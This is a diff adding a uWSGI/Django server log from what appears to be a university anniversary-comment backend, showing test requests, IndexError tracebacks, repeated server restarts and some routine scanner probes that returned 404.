+[pid: 26824|app: 0|req: 2/2] 122.238.121.81 () {42 vars in 972 bytes} [Sat May 30 14:04:04 2020] GET /addComment/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB/17%E7%BA%A7/7%E7%8F%AD/%E5%BC%A0%E4%B8%89/%E7%A5%9D%E7%A6%8F/123 => generated 207725 bytes in 1346 msecs (HTTP/1.1 500) 5 headers in 157 bytes (2 switches on core 0)
+[pid: 26824|app: 0|req: 3/3] 122.238.121.81 () {44 vars in 1003 bytes} [Sat May 30 14:05:16 2020] GET /addComment/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB/17%E7%BA%A7/7%E7%8F%AD/%E5%BC%A0%E4%B8%89/%E7%A5%9D%E7%A6%8F/123 => generated 29 bytes in 1465 msecs (HTTP/1.1 200) 4 headers in 127 bytes (2 switches on core 0)
+Not Found: /
+[pid: 26824|app: 0|req: 4/4] 179.189.200.145 () {32 vars in 465 bytes} [Sat May 30 14:24:23 2020] GET / => generated 2550 bytes in 3 msecs (HTTP/1.1 404) 4 headers in 129 bytes (2 switches on core 0)
+Not Found: /
+[pid: 26824|app: 0|req: 5/5] 181.16.181.120 () {32 vars in 464 bytes} [Sat May 30 14:25:49 2020] GET / => generated 2550 bytes in 3 msecs (HTTP/1.1 404) 4 headers in 129 bytes (2 switches on core 0)
+Not Found: /
+[pid: 26824|app: 0|req: 6/6] 168.197.160.18 () {32 vars in 464 bytes} [Sat May 30 14:42:46 2020] GET / => generated 2550 bytes in 2 msecs (HTTP/1.1 404) 4 headers in 129 bytes (2 switches on core 0)
+Not Found: /
+[pid: 26824|app: 0|req: 7/7] 80.50.98.102 () {32 vars in 463 bytes} [Sat May 30 14:55:49 2020] GET / => generated 2550 bytes in 3 msecs (HTTP/1.1 404) 4 headers in 129 bytes (2 switches on core 0)
+Not Found: /sdk
+[pid: 26824|app: 0|req: 8/8] 101.133.136.70 () {34 vars in 520 bytes} [Sat May 30 16:32:03 2020] POST /sdk => generated 2575 bytes in 3 msecs (HTTP/1.1 404) 4 headers in 129 bytes (2 switches on core 0)
+Not Found: /nmaplowercheck1590856312
+[pid: 26824|app: 0|req: 9/9] 101.133.136.70 () {32 vars in 532 bytes} [Sat May 30 16:32:04 2020] GET /nmaplowercheck1590856312 => generated 2637 bytes in 3 msecs (HTTP/1.1 404) 4 headers in 129 bytes (2 switches on core 0)
+Not Found: /HNAP1
+[pid: 26824|app: 0|req: 10/10] 101.133.136.70 () {32 vars in 494 bytes} [Sat May 30 16:32:04 2020] GET /HNAP1 => generated 2580 bytes in 3 msecs (HTTP/1.1 404) 4 headers in 129 bytes (1 switches on core 0)
+Not Found: /evox/about
+[pid: 26824|app: 0|req: 11/11] 101.133.136.70 () {32 vars in 504 bytes} [Sat May 30 16:32:10 2020] GET /evox/about => generated 2595 bytes in 3 msecs (HTTP/1.1 404) 4 headers in 129 bytes (2 switches on core 0)
+Not Found: /
+[pid: 26824|app: 0|req: 12/12] 101.133.136.70 () {28 vars in 308 bytes} [Sat May 30 16:32:30 2020] GET / => generated 2547 bytes in 2 msecs (HTTP/1.1 404) 4 headers in 129 bytes (2 switches on core 0)
+Not Found: /
+[pid: 26824|app: 0|req: 13/13] 128.14.134.170 () {34 vars in 488 bytes} [Sat May 30 17:56:57 2020] GET / => generated 2547 bytes in 3 msecs (HTTP/1.1 404) 4 headers in 129 bytes (2 switches on core 0)
+Not Found: /
+[pid: 26824|app: 0|req: 14/14] 82.137.255.161 () {36 vars in 539 bytes} [Sat May 30 18:30:19 2020] GET / => generated 2550 bytes in 3 msecs (HTTP/1.1 404) 4 headers in 129 bytes (2 switches on core 0)
+Not Found: /
+[pid: 26824|app: 0|req: 15/15] 45.71.230.17 () {32 vars in 462 bytes} [Sat May 30 19:02:57 2020] GET / => generated 2550 bytes in 3 msecs (HTTP/1.1 404) 4 headers in 129 bytes (2 switches on core 0)
+Not Found: /
+[pid: 26824|app: 0|req: 16/16] 82.84.154.38 () {32 vars in 462 bytes} [Sat May 30 19:23:09 2020] GET / => generated 2550 bytes in 3 msecs (HTTP/1.1 404) 4 headers in 129 bytes (2 switches on core 0)
+Not Found: /hudson
+[pid: 26824|app: 0|req: 17/17] 162.243.138.183 () {34 vars in 407 bytes} [Sat May 30 21:47:04 2020] GET /hudson => generated 2583 bytes in 5 msecs (HTTP/1.1 404) 4 headers in 129 bytes (2 switches on core 0)
+Not Found: /
+[pid: 26824|app: 0|req: 18/18] 189.39.249.82 () {32 vars in 470 bytes} [Sat May 30 21:49:58 2020] GET / => generated 2550 bytes in 3 msecs (HTTP/1.1 404) 4 headers in 129 bytes (2 switches on core 0)
+Not Found: /webdav/
+[pid: 26824|app: 0|req: 19/19] 193.112.8.175 () {32 vars in 378 bytes} [Sat May 30 21:59:27 2020] GET /webdav/ => generated 2589 bytes in 3 msecs (HTTP/1.1 404) 4 headers in 129 bytes (2 switches on core 0)
+Not Found: /
+[pid: 26824|app: 0|req: 20/20] 46.12.128.226 () {32 vars in 463 bytes} [Sun May 31 01:16:11 2020] GET / => generated 2550 bytes in 3 msecs (HTTP/1.1 404) 4 headers in 129 bytes (2 switches on core 0)
+Not Found: /
+[pid: 26824|app: 0|req: 21/21] 47.101.201.167 () {34 vars in 460 bytes} [Sun May 31 01:39:15 2020] GET / => generated 2547 bytes in 3 msecs (HTTP/1.1 404) 4 headers in 129 bytes (2 switches on core 0)
+Not Found: /
+[pid: 26824|app: 0|req: 22/22] 89.44.176.224 () {32 vars in 463 bytes} [Sun May 31 02:50:22 2020] GET / => generated 2550 bytes in 3 msecs (HTTP/1.1 404) 4 headers in 129 bytes (2 switches on core 0)
+Internal Server Error: /selectComment
+Traceback (most recent call last):
+  File "/root/miniconda3/lib/python3.7/site-packages/django/core/handlers/exception.py", line 34, in inner
+    response = get_response(request)
+  File "/root/miniconda3/lib/python3.7/site-packages/django/core/handlers/base.py", line 115, in _get_response
+    response = self.process_exception_by_middleware(e, request)
+  File "/root/miniconda3/lib/python3.7/site-packages/django/core/handlers/base.py", line 113, in _get_response
+    response = wrapped_callback(request, *callback_args, **callback_kwargs)
+  File "./backendApi/views.py", line 50, in selectComment
+    x = int(tmp[2])
+IndexError: list index out of range
+[pid: 26824|app: 0|req: 23/23] 122.238.122.231 () {42 vars in 835 bytes} [Sun May 31 02:55:25 2020] GET /selectComment => generated 59224 bytes in 25 msecs (HTTP/1.1 500) 5 headers in 156 bytes (2 switches on core 0)
+Not Found: /favicon.ico
+[pid: 26824|app: 0|req: 24/24] 122.238.122.231 () {42 vars in 761 bytes} [Sun May 31 02:55:25 2020] GET /favicon.ico => generated 2598 bytes in 2 msecs (HTTP/1.1 404) 4 headers in 129 bytes (1 switches on core 0)
+Internal Server Error: /selectComment、1
+Traceback (most recent call last):
+  File "/root/miniconda3/lib/python3.7/site-packages/django/core/handlers/exception.py", line 34, in inner
+    response = get_response(request)
+  File "/root/miniconda3/lib/python3.7/site-packages/django/core/handlers/base.py", line 115, in _get_response
+    response = self.process_exception_by_middleware(e, request)
+  File "/root/miniconda3/lib/python3.7/site-packages/django/core/handlers/base.py", line 113, in _get_response
+    response = wrapped_callback(request, *callback_args, **callback_kwargs)
+  File "./backendApi/views.py", line 50, in selectComment
+    x = int(tmp[2])
+IndexError: list index out of range
+[pid: 26824|app: 0|req: 25/25] 122.238.122.231 () {42 vars in 849 bytes} [Sun May 31 02:55:29 2020] GET /selectComment%E3%80%811 => generated 59318 bytes in 24 msecs (HTTP/1.1 500) 5 headers in 156 bytes (2 switches on core 0)
+[pid: 26824|app: 0|req: 26/26] 122.238.122.231 () {42 vars in 839 bytes} [Sun May 31 02:55:32 2020] GET /selectComment/1 => generated 158 bytes in 3 msecs (HTTP/1.1 200) 4 headers in 128 bytes (2 switches on core 0)
+Sun May 31 02:57:51 2020 - uWSGI worker 1 screams: UAAAAAAH my master disconnected: i will kill myself !!!
+*** Starting uWSGI 2.0.18 (64bit) on [Sun May 31 10:57:57 2020] ***
+compiled with version: 7.3.0 on 22 July 2019 16:51:41
+os: Linux-4.15.0-48-generic #51-Ubuntu SMP Wed Apr 3 08:28:49 UTC 2019
+nodename: Quasrain
+machine: x86_64
+clock source: unix
+pcre jit disabled
+detected number of CPU cores: 1
+current working directory: /root/HIT-100th-Anniversary-Celebration/backend
+detected binary path: /root/miniconda3/bin/uwsgi
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+chdir() to .
+your processes number limit is 7798
+your memory page size is 4096 bytes
+detected max file descriptor number: 65535
+lock engine: pthread robust mutexes
+thunder lock: disabled (you can enable it with --thunder-lock)
+uwsgi socket 0 bound to UNIX address ./backend.sock fd 3
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+Python version: 3.7.3 | packaged by conda-forge | (default, Jul  1 2019, 21:52:21)  [GCC 7.3.0]
+Python main interpreter initialized at 0x559d476d0cb0
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+python threads support enabled
+your server socket listen backlog is limited to 100 connections
+your mercy for graceful operations on workers is 60 seconds
+mapped 145840 bytes (142 KB) for 1 cores
+*** Operational MODE: single process ***
+WSGI app 0 (mountpoint='') ready in 1 seconds on interpreter 0x559d476d0cb0 pid: 28067 (default app)
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+*** uWSGI is running in multiple interpreter mode ***
+spawned uWSGI master process (pid: 28067)
+spawned uWSGI worker 1 (pid: 28068, cores: 1)
+[pid: 28068|app: 0|req: 1/1] 122.238.122.231 () {44 vars in 870 bytes} [Sun May 31 02:58:03 2020] GET /selectComment/1 => generated 158 bytes in 117 msecs (HTTP/1.1 200) 4 headers in 128 bytes (2 switches on core 0)
+Internal Server Error: /addComment/17级/7班/张三/祝福/123
+Traceback (most recent call last):
+  File "/root/miniconda3/lib/python3.7/site-packages/django/core/handlers/exception.py", line 34, in inner
+    response = get_response(request)
+  File "/root/miniconda3/lib/python3.7/site-packages/django/core/handlers/base.py", line 115, in _get_response
+    response = self.process_exception_by_middleware(e, request)
+  File "/root/miniconda3/lib/python3.7/site-packages/django/core/handlers/base.py", line 113, in _get_response
+    response = wrapped_callback(request, *callback_args, **callback_kwargs)
+  File "./backendApi/views.py", line 31, in addComment
+    comment.phone = tmp[7]
+IndexError: list index out of range
+[pid: 28068|app: 0|req: 2/2] 122.238.122.231 () {42 vars in 924 bytes} [Sun May 31 02:58:16 2020] GET /addComment//17%E7%BA%A7/7%E7%8F%AD/%E5%BC%A0%E4%B8%89/%E7%A5%9D%E7%A6%8F/123 => generated 59962 bytes in 25 msecs (HTTP/1.1 500) 5 headers in 156 bytes (2 switches on core 0)
+Internal Server Error: /addComment/17级/7班/张三/祝福/123
+Traceback (most recent call last):
+  File "/root/miniconda3/lib/python3.7/site-packages/django/core/handlers/exception.py", line 34, in inner
+    response = get_response(request)
+  File "/root/miniconda3/lib/python3.7/site-packages/django/core/handlers/base.py", line 115, in _get_response
+    response = self.process_exception_by_middleware(e, request)
+  File "/root/miniconda3/lib/python3.7/site-packages/django/core/handlers/base.py", line 113, in _get_response
+    response = wrapped_callback(request, *callback_args, **callback_kwargs)
+  File "./backendApi/views.py", line 31, in addComment
+    comment.phone = tmp[7]
+IndexError: list index out of range
+[pid: 28068|app: 0|req: 3/3] 122.238.122.231 () {44 vars in 955 bytes} [Sun May 31 02:58:32 2020] GET /addComment//17%E7%BA%A7/7%E7%8F%AD/%E5%BC%A0%E4%B8%89/%E7%A5%9D%E7%A6%8F/123 => generated 60099 bytes in 21 msecs (HTTP/1.1 500) 5 headers in 156 bytes (2 switches on core 0)
+*** Starting uWSGI 2.0.18 (64bit) on [Sun May 31 10:58:35 2020] ***
+compiled with version: 7.3.0 on 22 July 2019 16:51:41
+os: Linux-4.15.0-48-generic #51-Ubuntu SMP Wed Apr 3 08:28:49 UTC 2019
+nodename: Quasrain
+machine: x86_64
+clock source: unix
+pcre jit disabled
+detected number of CPU cores: 1
+current working directory: /root/HIT-100th-Anniversary-Celebration/backend
+detected binary path: /root/miniconda3/bin/uwsgi
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+chdir() to .
+your processes number limit is 7798
+your memory page size is 4096 bytes
+detected max file descriptor number: 65535
+lock engine: pthread robust mutexes
+thunder lock: disabled (you can enable it with --thunder-lock)
+uwsgi socket 0 bound to UNIX address ./backend.sock fd 3
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+Python version: 3.7.3 | packaged by conda-forge | (default, Jul  1 2019, 21:52:21)  [GCC 7.3.0]
+Python main interpreter initialized at 0x55d9f20b6cb0
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+python threads support enabled
+your server socket listen backlog is limited to 100 connections
+your mercy for graceful operations on workers is 60 seconds
+mapped 145840 bytes (142 KB) for 1 cores
+*** Operational MODE: single process ***
+WSGI app 0 (mountpoint='') ready in 0 seconds on interpreter 0x55d9f20b6cb0 pid: 28071 (default app)
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+*** uWSGI is running in multiple interpreter mode ***
+spawned uWSGI master process (pid: 28071)
+spawned uWSGI worker 1 (pid: 28072, cores: 1)
+*** Starting uWSGI 2.0.18 (64bit) on [Sun May 31 10:58:38 2020] ***
+compiled with version: 7.3.0 on 22 July 2019 16:51:41
+os: Linux-4.15.0-48-generic #51-Ubuntu SMP Wed Apr 3 08:28:49 UTC 2019
+nodename: Quasrain
+machine: x86_64
+clock source: unix
+pcre jit disabled
+detected number of CPU cores: 1
+current working directory: /root/HIT-100th-Anniversary-Celebration/backend
+detected binary path: /root/miniconda3/bin/uwsgi
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+chdir() to .
+your processes number limit is 7798
+your memory page size is 4096 bytes
+detected max file descriptor number: 65535
+lock engine: pthread robust mutexes
+thunder lock: disabled (you can enable it with --thunder-lock)
+uwsgi socket 0 bound to UNIX address ./backend.sock fd 3
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+Python version: 3.7.3 | packaged by conda-forge | (default, Jul  1 2019, 21:52:21)  [GCC 7.3.0]
+Python main interpreter initialized at 0x5565a907ccb0
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+python threads support enabled
+your server socket listen backlog is limited to 100 connections
+your mercy for graceful operations on workers is 60 seconds
+mapped 145840 bytes (142 KB) for 1 cores
+*** Operational MODE: single process ***
+WSGI app 0 (mountpoint='') ready in 0 seconds on interpreter 0x5565a907ccb0 pid: 28075 (default app)
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+*** uWSGI is running in multiple interpreter mode ***
+spawned uWSGI master process (pid: 28075)
+spawned uWSGI worker 1 (pid: 28076, cores: 1)
+Sun May 31 02:58:40 2020 - uWSGI worker 1 screams: UAAAAAAH my master disconnected: i will kill myself !!!
+Sun May 31 02:58:40 2020 - uWSGI worker 1 screams: UAAAAAAH my master disconnected: i will kill myself !!!
+Sun May 31 02:58:40 2020 - uWSGI worker 1 screams: UAAAAAAH my master disconnected: i will kill myself !!!
+*** Starting uWSGI 2.0.18 (64bit) on [Sun May 31 10:58:41 2020] ***
+compiled with version: 7.3.0 on 22 July 2019 16:51:41
+os: Linux-4.15.0-48-generic #51-Ubuntu SMP Wed Apr 3 08:28:49 UTC 2019
+nodename: Quasrain
+machine: x86_64
+clock source: unix
+pcre jit disabled
+detected number of CPU cores: 1
+current working directory: /root/HIT-100th-Anniversary-Celebration/backend
+detected binary path: /root/miniconda3/bin/uwsgi
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+chdir() to .
+your processes number limit is 7798
+your memory page size is 4096 bytes
+detected max file descriptor number: 65535
+lock engine: pthread robust mutexes
+thunder lock: disabled (you can enable it with --thunder-lock)
+uwsgi socket 0 bound to UNIX address ./backend.sock fd 3
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+Python version: 3.7.3 | packaged by conda-forge | (default, Jul  1 2019, 21:52:21)  [GCC 7.3.0]
+Python main interpreter initialized at 0x557108a50cb0
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+python threads support enabled
+your server socket listen backlog is limited to 100 connections
+your mercy for graceful operations on workers is 60 seconds
+mapped 145840 bytes (142 KB) for 1 cores
+*** Operational MODE: single process ***
+WSGI app 0 (mountpoint='') ready in 1 seconds on interpreter 0x557108a50cb0 pid: 28080 (default app)
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+*** uWSGI is running in multiple interpreter mode ***
+spawned uWSGI master process (pid: 28080)
+spawned uWSGI worker 1 (pid: 28081, cores: 1)
+Internal Server Error: /addComment/17级/7班/张三/祝福/123
+Traceback (most recent call last):
+  File "/root/miniconda3/lib/python3.7/site-packages/django/core/handlers/exception.py", line 34, in inner
+    response = get_response(request)
+  File "/root/miniconda3/lib/python3.7/site-packages/django/core/handlers/base.py", line 115, in _get_response
+    response = self.process_exception_by_middleware(e, request)
+  File "/root/miniconda3/lib/python3.7/site-packages/django/core/handlers/base.py", line 113, in _get_response
+    response = wrapped_callback(request, *callback_args, **callback_kwargs)
+  File "./backendApi/views.py", line 31, in addComment
+    comment.phone = tmp[7]
+IndexError: list index out of range
+[pid: 28081|app: 0|req: 1/1] 122.238.122.231 () {44 vars in 955 bytes} [Sun May 31 02:58:42 2020] GET /addComment//17%E7%BA%A7/7%E7%8F%AD/%E5%BC%A0%E4%B8%89/%E7%A5%9D%E7%A6%8F/123 => generated 60099 bytes in 134 msecs (HTTP/1.1 500) 5 headers in 156 bytes (1 switches on core 0)
+Internal Server Error: /addComment/17级/7班/张三/祝福/123
+Traceback (most recent call last):
+  File "/root/miniconda3/lib/python3.7/site-packages/django/core/handlers/exception.py", line 34, in inner
+    response = get_response(request)
+  File "/root/miniconda3/lib/python3.7/site-packages/django/core/handlers/base.py", line 115, in _get_response
+    response = self.process_exception_by_middleware(e, request)
+  File "/root/miniconda3/lib/python3.7/site-packages/django/core/handlers/base.py", line 113, in _get_response
+    response = wrapped_callback(request, *callback_args, **callback_kwargs)
+  File "./backendApi/views.py", line 31, in addComment
+    comment.phone = tmp[7]
+IndexError: list index out of range
+[pid: 28081|app: 0|req: 2/2] 122.238.122.231 () {44 vars in 955 bytes} [Sun May 31 02:58:50 2020] GET /addComment//17%E7%BA%A7/7%E7%8F%AD/%E5%BC%A0%E4%B8%89/%E7%A5%9D%E7%A6%8F/123 => generated 60099 bytes in 21 msecs (HTTP/1.1 500) 5 headers in 156 bytes (1 switches on core 0)
+Sun May 31 02:58:52 2020 - uWSGI worker 1 screams: UAAAAAAH my master disconnected: i will kill myself !!!
+*** Starting uWSGI 2.0.18 (64bit) on [Sun May 31 10:58:52 2020] ***
+compiled with version: 7.3.0 on 22 July 2019 16:51:41
+os: Linux-4.15.0-48-generic #51-Ubuntu SMP Wed Apr 3 08:28:49 UTC 2019
+nodename: Quasrain
+machine: x86_64
+clock source: unix
+pcre jit disabled
+detected number of CPU cores: 1
+current working directory: /root/HIT-100th-Anniversary-Celebration/backend
+detected binary path: /root/miniconda3/bin/uwsgi
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+chdir() to .
+your processes number limit is 7798
+your memory page size is 4096 bytes
+detected max file descriptor number: 65535
+lock engine: pthread robust mutexes
+thunder lock: disabled (you can enable it with --thunder-lock)
+uwsgi socket 0 bound to UNIX address ./backend.sock fd 3
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+Python version: 3.7.3 | packaged by conda-forge | (default, Jul  1 2019, 21:52:21)  [GCC 7.3.0]
+Python main interpreter initialized at 0x55ccf6b84cb0
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+python threads support enabled
+your server socket listen backlog is limited to 100 connections
+your mercy for graceful operations on workers is 60 seconds
+mapped 145840 bytes (142 KB) for 1 cores
+*** Operational MODE: single process ***
+WSGI app 0 (mountpoint='') ready in 1 seconds on interpreter 0x55ccf6b84cb0 pid: 28085 (default app)
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+*** uWSGI is running in multiple interpreter mode ***
+spawned uWSGI master process (pid: 28085)
+spawned uWSGI worker 1 (pid: 28086, cores: 1)
+Internal Server Error: /addComment/17级/7班/张三/祝福/123
+Traceback (most recent call last):
+  File "/root/miniconda3/lib/python3.7/site-packages/django/core/handlers/exception.py", line 34, in inner
+    response = get_response(request)
+  File "/root/miniconda3/lib/python3.7/site-packages/django/core/handlers/base.py", line 115, in _get_response
+    response = self.process_exception_by_middleware(e, request)
+  File "/root/miniconda3/lib/python3.7/site-packages/django/core/handlers/base.py", line 113, in _get_response
+    response = wrapped_callback(request, *callback_args, **callback_kwargs)
+  File "./backendApi/views.py", line 31, in addComment
+    comment.phone = tmp[7]
+IndexError: list index out of range
+[pid: 28086|app: 0|req: 1/1] 122.238.122.231 () {44 vars in 955 bytes} [Sun May 31 02:58:53 2020] GET /addComment//17%E7%BA%A7/7%E7%8F%AD/%E5%BC%A0%E4%B8%89/%E7%A5%9D%E7%A6%8F/123 => generated 60099 bytes in 136 msecs (HTTP/1.1 500) 5 headers in 156 bytes (1 switches on core 0)
+[pid: 28086|app: 0|req: 2/2] 122.238.122.231 () {42 vars in 973 bytes} [Sun May 31 02:59:26 2020] GET /addComment/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB/17%E7%BA%A7/7%E7%8F%AD/%E5%BC%A0%E4%B8%89/%E7%A5%9D%E7%A6%8F/123 => generated 29 bytes in 2136 msecs (HTTP/1.1 200) 4 headers in 127 bytes (2 switches on core 0)
+Internal Server Error: /addComment/17级/7班/张三/祝福/123
+Traceback (most recent call last):
+  File "/root/miniconda3/lib/python3.7/site-packages/django/core/handlers/exception.py", line 34, in inner
+    response = get_response(request)
+  File "/root/miniconda3/lib/python3.7/site-packages/django/core/handlers/base.py", line 115, in _get_response
+    response = self.process_exception_by_middleware(e, request)
+  File "/root/miniconda3/lib/python3.7/site-packages/django/core/handlers/base.py", line 113, in _get_response
+    response = wrapped_callback(request, *callback_args, **callback_kwargs)
+  File "./backendApi/views.py", line 31, in addComment
+    comment.phone = tmp[7]
+IndexError: list index out of range
+[pid: 28086|app: 0|req: 3/3] 122.238.122.231 () {42 vars in 924 bytes} [Sun May 31 02:59:36 2020] GET /addComment//17%E7%BA%A7/7%E7%8F%AD/%E5%BC%A0%E4%B8%89/%E7%A5%9D%E7%A6%8F/123 => generated 59962 bytes in 21 msecs (HTTP/1.1 500) 5 headers in 156 bytes (2 switches on core 0)
+Internal Server Error: /addComment/17级/7班/张三/祝福/123
+Traceback (most recent call last):
+  File "/root/miniconda3/lib/python3.7/site-packages/django/core/handlers/exception.py", line 34, in inner
+    response = get_response(request)
+  File "/root/miniconda3/lib/python3.7/site-packages/django/core/handlers/base.py", line 115, in _get_response
+    response = self.process_exception_by_middleware(e, request)
+  File "/root/miniconda3/lib/python3.7/site-packages/django/core/handlers/base.py", line 113, in _get_response
+    response = wrapped_callback(request, *callback_args, **callback_kwargs)
+  File "./backendApi/views.py", line 31, in addComment
+    comment.Comment = tmp[6]
+IndexError: list index out of range
+[pid: 28086|app: 0|req: 4/4] 122.238.122.231 () {44 vars in 955 bytes} [Sun May 31 03:00:03 2020] GET /addComment//17%E7%BA%A7/7%E7%8F%AD/%E5%BC%A0%E4%B8%89/%E7%A5%9D%E7%A6%8F/123 => generated 60099 bytes in 22 msecs (HTTP/1.1 500) 5 headers in 156 bytes (2 switches on core 0)
+Sun May 31 03:00:05 2020 - uWSGI worker 1 screams: UAAAAAAH my master disconnected: i will kill myself !!!
+*** Starting uWSGI 2.0.18 (64bit) on [Sun May 31 11:00:05 2020] ***
+compiled with version: 7.3.0 on 22 July 2019 16:51:41
+os: Linux-4.15.0-48-generic #51-Ubuntu SMP Wed Apr 3 08:28:49 UTC 2019
+nodename: Quasrain
+machine: x86_64
+clock source: unix
+pcre jit disabled
+detected number of CPU cores: 1
+current working directory: /root/HIT-100th-Anniversary-Celebration/backend
+detected binary path: /root/miniconda3/bin/uwsgi
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+chdir() to .
+your processes number limit is 7798
+your memory page size is 4096 bytes
+detected max file descriptor number: 65535
+lock engine: pthread robust mutexes
+thunder lock: disabled (you can enable it with --thunder-lock)
+uwsgi socket 0 bound to UNIX address ./backend.sock fd 3
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+Python version: 3.7.3 | packaged by conda-forge | (default, Jul  1 2019, 21:52:21)  [GCC 7.3.0]
+Python main interpreter initialized at 0x558054dfccb0
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+python threads support enabled
+your server socket listen backlog is limited to 100 connections
+your mercy for graceful operations on workers is 60 seconds
+mapped 145840 bytes (142 KB) for 1 cores
+*** Operational MODE: single process ***
+WSGI app 0 (mountpoint='') ready in 0 seconds on interpreter 0x558054dfccb0 pid: 28092 (default app)
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+*** uWSGI is running in multiple interpreter mode ***
+spawned uWSGI master process (pid: 28092)
+spawned uWSGI worker 1 (pid: 28093, cores: 1)
+[pid: 28093|app: 0|req: 1/1] 122.238.122.231 () {44 vars in 955 bytes} [Sun May 31 03:00:06 2020] GET /addComment//17%E7%BA%A7/7%E7%8F%AD/%E5%BC%A0%E4%B8%89/%E7%A5%9D%E7%A6%8F/123 => generated 5 bytes in 110 msecs (HTTP/1.1 200) 4 headers in 134 bytes (2 switches on core 0)
+Sun May 31 03:03:48 2020 - uWSGI worker 1 screams: UAAAAAAH my master disconnected: i will kill myself !!!
+*** Starting uWSGI 2.0.18 (64bit) on [Sun May 31 11:03:49 2020] ***
+compiled with version: 7.3.0 on 22 July 2019 16:51:41
+os: Linux-4.15.0-48-generic #51-Ubuntu SMP Wed Apr 3 08:28:49 UTC 2019
+nodename: Quasrain
+machine: x86_64
+clock source: unix
+pcre jit disabled
+detected number of CPU cores: 1
+current working directory: /root/HIT-100th-Anniversary-Celebration/backend
+detected binary path: /root/miniconda3/bin/uwsgi
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+chdir() to .
+your processes number limit is 7798
+your memory page size is 4096 bytes
+detected max file descriptor number: 65535
+lock engine: pthread robust mutexes
+thunder lock: disabled (you can enable it with --thunder-lock)
+uwsgi socket 0 bound to UNIX address ./backend.sock fd 3
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+Python version: 3.7.3 | packaged by conda-forge | (default, Jul  1 2019, 21:52:21)  [GCC 7.3.0]
+Python main interpreter initialized at 0x564876690cb0
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+python threads support enabled
+your server socket listen backlog is limited to 100 connections
+your mercy for graceful operations on workers is 60 seconds
+mapped 145840 bytes (142 KB) for 1 cores
+*** Operational MODE: single process ***
+WSGI app 0 (mountpoint='') ready in 0 seconds on interpreter 0x564876690cb0 pid: 28098 (default app)
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+*** uWSGI is running in multiple interpreter mode ***
+spawned uWSGI master process (pid: 28098)
+spawned uWSGI worker 1 (pid: 28099, cores: 1)
+[pid: 28099|app: 0|req: 1/1] 122.238.122.231 () {44 vars in 955 bytes} [Sun May 31 03:03:51 2020] GET /addComment//17%E7%BA%A7/7%E7%8F%AD/%E5%BC%A0%E4%B8%89/%E7%A5%9D%E7%A6%8F/123 => generated 34 bytes in 111 msecs (HTTP/1.1 200) 4 headers in 135 bytes (2 switches on core 0)
+[pid: 28099|app: 0|req: 2/2] 122.238.122.231 () {44 vars in 955 bytes} [Sun May 31 03:04:30 2020] GET /addComment//17%E7%BA%A7/7%E7%8F%AD/%E5%BC%A0%E4%B8%89/%E7%A5%9D%E7%A6%8F/123 => generated 34 bytes in 0 msecs (HTTP/1.1 200) 4 headers in 135 bytes (2 switches on core 0)
+Sun May 31 03:04:34 2020 - uWSGI worker 1 screams: UAAAAAAH my master disconnected: i will kill myself !!!
+*** Starting uWSGI 2.0.18 (64bit) on [Sun May 31 11:04:34 2020] ***
+compiled with version: 7.3.0 on 22 July 2019 16:51:41
+os: Linux-4.15.0-48-generic #51-Ubuntu SMP Wed Apr 3 08:28:49 UTC 2019
